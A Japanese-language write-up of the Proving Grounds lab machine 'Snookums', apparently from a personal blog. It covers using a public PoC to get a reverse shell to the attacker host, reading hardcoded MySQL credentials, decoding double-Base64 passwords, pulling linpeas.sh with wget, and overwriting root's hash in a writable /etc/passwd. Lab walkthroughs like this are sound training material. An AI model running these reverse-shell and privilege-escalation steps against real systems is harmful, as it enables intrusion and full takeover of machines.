+++
title = "Proving Grounds Practice - Snookums"
date = "2026-10-11"
description = "Simple PHP Photo Gallery v0.8の公開PoCでapache権限のシェルを取得し、MySQL内の二重Base64エンコードされたクレデンシャルを復元してmichaelでSSHログイン、書き込み可能な/etc/passwdを悪用してroot権限を取得"
tags = ["Proving Grounds Play", "CTF", "[Linux]", "[PHP]", "[MySQL]", "[OpenSSL]", "[intermediate]"]
categories = ["Proving Grounds Play"]
toc = true
draft = false
+++

## Machine Info

| Field            | Details      |
| ---------------- | ------------ |
| Machine          | Snookums     |
| OS               | Linux        |
| # of Flags       | 2            |
| Created By       | OffSec       |
| Community Rating | Intermediate |

---

## Reconnaissance

### Nmap Scan (TCP)

```bash
nmap -sV -sC -p- 192.168.192.58
```

```text
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
```

- `21/tcp`: vsftpd 3.0.2、Anonymousログインは許可されているが有用なファイルは見つからず
- `80/tcp`: Apache + PHP/5.4.16、"Simple PHP Photo Gallery" が稼働
- `139,445/tcp`: Samba（workgroup: SAMBA、ホスト名 `snookums`）
- `3306/tcp`: MySQL

Service Info からOSは `Unix`（ホスト名 `SNOOKUMS`）であることが分かりました。

### Web Enumeration

ポート80へアクセスすると "Simple PHP Photo Gallery" のトップページが表示され、バージョンが `v0.8` であることを確認しました。

```bash
searchsploit Simple PHP Photo Gallery
```

関連するexploitは直接ヒットしませんでしたが、`v0.8` に対する公開PoCスクリプト（`SimplePHPGal-RCE.py`）がGitHub上に存在することを確認しました。

> https://github.com/beauknowstech/SimplePHPGal-RCE.py/blob/main/README.md

---

## Initial Access

### Simple PHP Photo Gallery v0.8 - RCE (公開PoCスクリプト)

バージョン `v0.8` に対する公開PoCスクリプト（`SimplePHPGal-RCE.py`）を利用しました。

> https://github.com/beauknowstech/SimplePHPGal-RCE.py

```bash
python3 a.py http://192.168.192.58 192.168.45.202 445
```

```text
[✔] Serving HTTP traffic from /home/kali/offsec on 192.168.45.202 using port 80 in background
Run 'nc -nlvp 445' on attacker machine in another terminal. Then press any key to continue
Attempting to reach reverse shell on 192.168.45.202 on port 80
192.168.192.58 - - [11/Oct/2026 22:00:28] "GET /rev.php HTTP/1.0" 200 -
Request sent. Check your nc for a connection
```

別ターミナルでリスナーを起動し、シェルの接続を確認しました。

```bash
nc -nlvp 445
```

```text
listening on [any] 445 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.192.58] 35166
SOCKET: Shell has connected! PID: 2318
```

`apache` ユーザーとしてシェルを獲得し、Webルート（`/var/www/html`）に移動しました。

```text
pwd
/var/www/html
ls
README.txt
UpgradeInstructions.txt
css
db.php
embeddedGallery.php
functions.php
image.php
images
index.php
js
license.txt
photos
phpGalleryConfig.php
phpGalleryStyle-RED.css
phpGalleryStyle.css
phpGallery_images
phpGallery_thumbs
thumbnail_generator.php
```

TTYを安定化させます。

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation (apache → michael)

### DB Credential Disclosure

`/var/www/html/db.php` にMySQL接続情報が平文でハードコードされていました。

```text
DBHOST: 127.0.0.1
DBUSER: root
DBPASS: MalapropDoffUtilize1337
DBNAME: SimplePHPGal
```

### MySQL内のユーザー情報奪取

```bash
mysql -u root -p
```

`SimplePHPGal` データベースの `users` テーブルから、ユーザー名とBase64エンコードされたパスワードを取得しました。

```text
+----------+-----------------------------------------------+
| username | password                                        |
+----------+-----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=   |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==       |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==        |
+----------+-----------------------------------------------+
```

値は一見Base64に見えますが、1回デコードしても再びBase64文字列が出力され、**二重エンコード**されていることが分かります。

```bash
echo -n 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d
```

```text
HockSydneyCertify123
```

`/etc/passwd` を確認するとローカルユーザー `michael` が存在したため、復元したクレデンシャルでSSHログインを試みました。

```bash
ssh michael@192.168.192.58
```

ログインに成功し、ユーザーフラグ `local.txt` を取得しました。

---

## Privilege Escalation (michael → root)

### linpeas.sh の転送

権限昇格の調査のため `michael` のホームディレクトリに `linpeas.sh` を転送しました。

```bash
wget http://192.168.45.202:8000/linpeas.sh
```

### /etc/passwd の書き換えによる昇格

`/etc/passwd` が書き込み可能であったため、`openssl` で新しいパスワードハッシュを生成し、`root` エントリのパスワードフィールドを差し替えました。

`/etc/passwd` に書き込み権限があるため、`openssl` で新しいパスワードハッシュを生成し、`root` エントリのパスワードフィールドを差し替えます。

```bash
openssl passwd password
```

```text
JVnjw63p0k1cA
```

```bash
vi /etc/passwd
```

```text
root:JVnjw63p0k1cA:0:0:root:/root:/bin/bash
```

生成したパスワードで `root` に昇格します。

```bash
su -
```

```text
Password:
[root@snookums ~]# cat proof.txt
```

root権限を取得し、プルーフフラグを確認しました。

---

## Summary

今回の攻撃経路は以下の通りです。

```text
Nmap (TCP)
  ↓
Simple PHP Photo Gallery v0.8 を確認
  ↓
公開PoC (SimplePHPGal-RCE.py) でリバースシェル取得 (apache)
  ↓
db.php からMySQL認証情報を奪取
  ↓
usersテーブルから二重Base64エンコードされたパスワードを取得・デコード
  ↓
ssh michael (local.txt 取得)
  ↓
linpeas.sh転送 → /etc/passwd の書き込み権限を確認
  ↓
openssl passwdでハッシュ生成 → /etc/passwd改ざん
  ↓
su - root (proof.txt 取得)
```

### Key Commands

```bash
# Port scan (TCP全ポート)
nmap -sV -sC -p- 192.168.192.58

# Exploit実行 (公開PoCスクリプト)
python3 a.py http://192.168.192.58 192.168.45.202 445
nc -nlvp 445

# TTY安定化
python -c 'import pty; pty.spawn("/bin/bash")'

# DB認証情報確認
cat /var/www/html/db.php

# MySQLログイン & ユーザー一覧取得
mysql -u root -p
select username,password from users;

# 二重Base64デコード
echo -n '<base64>' | base64 -d | base64 -d

# SSHログイン
ssh michael@192.168.192.58

# linpeas.sh転送
wget http://192.168.45.202:8000/linpeas.sh

# パスワードハッシュ生成 & /etc/passwd改ざん後
openssl passwd password
vi /etc/passwd
su -
```

### Lessons Learned

- 古いPHPアプリケーション（Simple PHP Photo Gallery v0.8）に既知の脆弱性が存在し、パッチ未適用のまま公開されていた。
- DB接続情報がWebルート直下の平文PHPファイルにハードコードされていた。
- パスワードの「エンコード」は暗号化ではなく、Base64を多重にかけても容易に復元可能（セキュリティ・バイ・オブスキュリティの失敗例）。
- `/etc/passwd` への書き込み権限の管理不備により、任意ユーザーのパスワードハッシュを差し替えてroot奪取が可能だった。

### References

- https://github.com/beauknowstech/SimplePHPGal-RCE.py/blob/main/README.md
